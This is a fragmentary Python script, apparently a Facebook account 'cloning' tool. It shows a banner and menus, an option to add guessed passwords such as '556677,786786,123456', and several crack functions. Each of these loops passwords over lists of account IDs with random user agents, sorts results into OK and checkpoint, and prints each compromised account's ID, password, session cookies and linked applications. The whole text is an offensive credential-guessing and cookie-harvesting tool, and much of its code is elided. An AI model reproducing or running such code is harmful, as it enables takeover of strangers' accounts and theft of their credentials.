...
#Chnge Name 
	print('[[\x1b[1;92mтАв\x1b[1;97m] [\x1b[1;97mMR-QURESHI-XD]')
...
def banner():
  ...
  \__ \/ /_/ / / / /| | / / / / /
 ___/ / __  / /_/ / | |/ / /_/ / 
/____/_/ /_/\____/  |___/\____/ [тАв] Master MindЁЯе║тЭдя╕П                                      '''
...
#-------------[ Id -Crackiing]---------------#
def setting():
	cetak(nel('\t[bold cyan]         CLONING MENU тАв [/bold cyan]'))
	print('') 
	...
	if hu in ['1','01']:
		...
		print('=>TRY AGAIN')
		exit()
	cetak(nel('\t[bold cyan]             тАв METHODE LOGIN тАв [/bold cyan]'))
	print('') 
...
#   elif _jembot_ in ['y','Y']:
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[purple]тАв[yellow]] ADD PASWORD MXM 6 WORDS\n[[purple]тАв[yellow]] EXIMPLE :[green] 556677,786786,123456[purple] '))
...
def passwrd():
	...
	print(f'[{h}тАв{u}]{h} OK : {h}%s '%(ok))
	print(f'{k}[{k}тАв{h}]{k} CP : {k}%s{u} '%(cp))
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}WASI-XD-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]тАФ{P}[{H}{ok}{P}]тАФ{P}[{k}{cp}{x}]тАФ[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     тЬи WASI-CHECKPOINT тЬи [red]'))
				...
				cetak(nel('[green]      тЭдя╕ПтЬи WASI-OK тЭдя╕ПтЬи[green]')) 
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\rтЭдя╕П {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]тАФ{P}[{H}{ok}{P}]тАФ{P}[{k}{cp}{x}]тАФ[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      ЁЯШнHELLO THIS MUSLIM-XD ЁЯдг[purple]')) 
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s тШм %s/%s тШм OK:%s тШм CP:%s тШм %s%s%s тШм'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[тАв] ID       : {idf} [тАв] PASSWORD : {pw}'
				...
				if 'no' in taplikasi:
					...
					infoakun += (f"\n[bold cyan][тАв] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					...
					hit=0
					infoakun += (f"\n[bold yellow][тАв] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					...
					print('\n')
					statusok = f'[bold green][тАв] ID       : {idf}\n[тАв] PASSWORD : {pw}\n[тАв] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
